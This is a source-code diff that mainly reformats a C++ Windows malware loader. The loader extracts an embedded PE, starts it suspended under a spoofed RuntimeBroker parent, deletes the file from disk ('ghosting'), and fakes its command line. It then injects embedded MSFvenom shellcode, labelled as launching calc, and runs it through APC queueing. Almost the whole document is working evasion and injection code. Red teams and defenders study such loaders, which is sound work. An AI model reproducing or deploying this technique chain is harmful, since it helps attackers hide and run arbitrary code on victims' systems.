@@ -1,212 +1,178 @@
 #include "../include/Main.hpp"
 
-
 //
 // Retrieves the PE file we'll be using from the .rsrc section.
 //
-void* GetStoredExecutableImage(_Out_ std::uint32_t& ImageSize) { 
+void* GetStoredExecutableImage(_Out_ std::uint32_t& ImageSize)
+{
+    HRSRC hRsrc                 = nullptr;
+    void* ResourceAddress       = nullptr;
+    HGLOBAL hGlobal             = nullptr;
+    std::uint32_t ResourceSize  = 0;
 
-	HRSRC hRsrc = nullptr;
-	HGLOBAL hGlobal = nullptr;
-	void* ResourceAddress = nullptr;
-	std::uint32_t ResourceSize = 0;
+    std::cout << "[+] Retrieving PE file from .rsrc section..." << std::endl;
+    hRsrc = FindResourceW(nullptr, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
 
+    if (!hRsrc)
+        return nullptr;
 
-	std::cout << "[+] Retrieving PE file from .rsrc section..." << std::endl;
-	hRsrc = FindResourceW(
-		nullptr,
-		MAKEINTRESOURCEW(IDR_RCDATA1),
-		RT_RCDATA);
+    hGlobal = LoadResource(nullptr, hRsrc);
+    if (!hGlobal)
+        return nullptr;
 
-	if (!hRsrc)
-		return nullptr;
+    ResourceAddress = LockResource(hGlobal);
+    if (!ResourceAddress)
+        return nullptr;
 
-	hGlobal = LoadResource(nullptr, hRsrc);
-	if (!hGlobal)
-		return nullptr;
+    ResourceSize = SizeofResource(nullptr, hRsrc);
+    if (!ResourceSize)
+        return nullptr;
 
-	ResourceAddress = LockResource(hGlobal);
-	if (!ResourceAddress)
-		return nullptr;
-
-	ResourceSize = SizeofResource(nullptr, hRsrc);
-	if (!ResourceSize)
-		return nullptr;
-
-
-	ImageSize = ResourceSize;
-	return ResourceAddress;
+    ImageSize = ResourceSize;
+    return ResourceAddress;
 }
-
-
 
 /* MSFvenom Calc Payload */
 unsigned char Payload[] = {
-	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
-	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
-	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
-	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
-	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
-	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
-	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
-	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
-	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
-	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
-	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
-	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
-	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
-	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
-	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
-	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
-	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
-	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
-	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
-	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
-	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
-	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
-	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
+    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
+    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
+    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
+    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
+    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
+    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
+    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
+    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
+    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
+    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
+    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
+    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
+    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
+    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
+    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
+    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
+    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
+    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
+    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
+    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
+    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
+    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
+    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
 };
 
+int main()
+{
+    std::tuple<HANDLE, std::wstring> TempFile;
+    std::tuple<HANDLE, HANDLE, std::uint32_t> SuspendedProcess;
+    std::wstring FakeCommandLine;
 
-int main() {
+    void* ResourcePtr       = nullptr;
+    byte* ImageHeapBuffer   = nullptr;
+    HANDLE ParentProcess    = nullptr;
 
-	std::tuple<HANDLE, std::wstring>          TempFile;
-	std::tuple<HANDLE, HANDLE, std::uint32_t> SuspendedProcess;
-	std::wstring                              FakeCommandLine;
+    std::uint32_t ResourceSize  = 0;
+    std::uint32_t CodeRva       = 0;
+    std::uint32_t BytesWritten  = 0;
 
-	void*         ResourcePtr = nullptr;
-	byte*         ImageHeapBuffer = nullptr;
-	HANDLE        ParentProcess = nullptr;
-	
-	std::uint32_t ResourceSize = 0;
-	std::uint32_t CodeRva = 0;
-	std::uint32_t BytesWritten = 0;
+    ParentProcess = EnumerateRuntimeBrokerProcess();
 
+    //
+    // Create temporary file
+    //
 
-	ParentProcess = EnumerateRuntimeBrokerProcess();
+    TempFile = CreateTemporaryFile();
+    if (std::get<0>(TempFile) == INVALID_HANDLE_VALUE)
+        return -1;
 
+    //
+    // Get stored PE file
+    //
 
-	//
-	// Create temporary file
-	//
+    ResourcePtr = GetStoredExecutableImage(ResourceSize);
+    if (ResourcePtr == nullptr || !ResourceSize)
+        return -1;
 
-	TempFile = CreateTemporaryFile();
-	if (std::get<0>(TempFile) == INVALID_HANDLE_VALUE)
-		return -1;
+    //
+    // Write PE file into .tmp file
+    //
 
+    ImageHeapBuffer = static_cast<byte*>(
+        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ResourceSize));
 
+    if (!ImageHeapBuffer)
+        return -1;
 
-	//
-	// Get stored PE file
-	//
+    memcpy(ImageHeapBuffer, ResourcePtr, ResourceSize);
 
-	ResourcePtr = GetStoredExecutableImage(ResourceSize);
-	if (ResourcePtr == nullptr || !ResourceSize)
-		return -1;
+    std::cout << "[+] Writing PE into .tmp file..." << std::endl;
+    if (!WriteFile(std::get<0>(TempFile), ImageHeapBuffer, ResourceSize,
+            (LPDWORD)&BytesWritten, nullptr)
+        || BytesWritten != ResourceSize)
+    {
 
+        WIN32_ERR(WriteFile);
+        return -1;
+    }
 
+    //
+    // Create suspended process.
+    // NOTE: to prevent sharing violations we must close the file handle first.
+    //
 
-	//
-	// Write PE file into .tmp file 
-	//
+    CloseHandle(std::get<0>(TempFile));
+    SuspendedProcess = CreateSuspendedProcess(std::get<1>(TempFile).c_str(), ParentProcess);
+    if (std::get<0>(SuspendedProcess) == nullptr)
+        return -1;
 
-	ImageHeapBuffer = static_cast<byte*>(HeapAlloc(
-		GetProcessHeap(),
-		HEAP_ZERO_MEMORY,
-		ResourceSize));
+    //
+    // Ghost the file on disk.
+    //
 
-	if (!ImageHeapBuffer)
-		return -1;
+    if (!DataStreamExploitDeleteFile(std::get<1>(TempFile).c_str()))
+        return -1;
 
-	
-	memcpy(ImageHeapBuffer, ResourcePtr, ResourceSize);
-	
-	std::cout << "[+] Writing PE into .tmp file..." << std::endl;
-	if (!WriteFile(
-		std::get<0>(TempFile),
-		ImageHeapBuffer,
-		ResourceSize,
-		(LPDWORD)&BytesWritten,
-		nullptr
-	) || BytesWritten != ResourceSize) {
+    std::cout << "[+] Created child process with PID: "
+              << std::get<2>(SuspendedProcess) << std::endl;
+    std::cout << "[+] Successfully deleted the .tmp file on disk." << std::endl;
 
-		WIN32_ERR(WriteFile);
-		return -1;
-	}
+    //
+    // Spoof Command-Line Arguments.
+    //
 
+    FakeCommandLine = std::move(GetFakeCommandLineArguments());
+    if (FakeCommandLine == L"")
+        return -1;
 
+    if (!SpoofCommandLine(FakeCommandLine.c_str(), std::get<0>(SuspendedProcess)))
+        return -1;
 
-	//
-	// Create suspended process.
-	// NOTE: to prevent sharing violations we must close the file handle first.
-	//
+    //
+    // Copy Payload Into Process At RWX region.
+    //
 
-	CloseHandle(std::get<0>(TempFile));
-	SuspendedProcess = CreateSuspendedProcess(std::get<1>(TempFile).c_str(), ParentProcess);
-	if (std::get<0>(SuspendedProcess) == nullptr)
-		return -1;
+    byte* RemoteImageBase = RetrieveImageBase(std::get<0>(SuspendedProcess));
+    if (RemoteImageBase == nullptr)
+        return -1;
 
+    if (!CopyPayloadIntoProcess(std::get<0>(SuspendedProcess),
+            RemoteImageBase + GetCodeRva(ImageHeapBuffer),
+            Payload, sizeof(Payload))) {
+        return -1;
+    }
 
+    //
+    // Run payload via APC queueing
+    //
 
-	//
-	// Ghost the file on disk.
-	//
+    std::cout << "\n[+] Press <ENTER> to run the payload and finish."
+              << std::endl;
+    std::cin.get();
 
-	if (!DataStreamExploitDeleteFile(std::get<1>(TempFile).c_str()))
-		return -1;
+    if (!QueueUserApcRunPayload(std::get<1>(SuspendedProcess),
+            RemoteImageBase + GetCodeRva(ImageHeapBuffer)))
+    {
+        return -1;
+    }
 
-	std::cout << "[+] Created child process with PID: " << std::get<2>(SuspendedProcess) << std::endl;
-	std::cout << "[+] Successfully deleted the .tmp file on disk." << std::endl;
-
-
-
-	//
-	// Spoof Command-Line Arguments.
-	//
-
-	FakeCommandLine = std::move(GetFakeCommandLineArguments());
-	if (FakeCommandLine == L"")
-		return -1;
-
-	if (!SpoofCommandLine(FakeCommandLine.c_str(), std::get<0>(SuspendedProcess)))
-		return -1;
-
-
-
-	//
-	// Copy Payload Into Process At RWX region.
-	//
-
-	byte* RemoteImageBase = RetrieveImageBase(std::get<0>(SuspendedProcess));
-	if (RemoteImageBase == nullptr)
-		return -1;
-
-	if (!CopyPayloadIntoProcess(
-		std::get<0>(SuspendedProcess),
-		RemoteImageBase + GetCodeRva(ImageHeapBuffer),
-		Payload,
-		sizeof(Payload) 
-	)) {
-		return -1;
-	}
-
-
-
-	//
-	// Run payload via APC queueing
-	//
-
-	std::cout << "\n[+] Press <ENTER> to run the payload and finish." << std::endl;
-	std::cin.get();
-
-	if (!QueueUserApcRunPayload(
-		std::get<1>(SuspendedProcess),
-		RemoteImageBase + GetCodeRva(ImageHeapBuffer) 
-	)) {
-
-		return -1;
-	}
-
-	std::cout << "\n[+] Finished successfully. Exiting..." << std::endl;
-	return 0;
+    std::cout << "\n[+] Finished successfully. Exiting..." << std::endl;
+    return 0;
 }
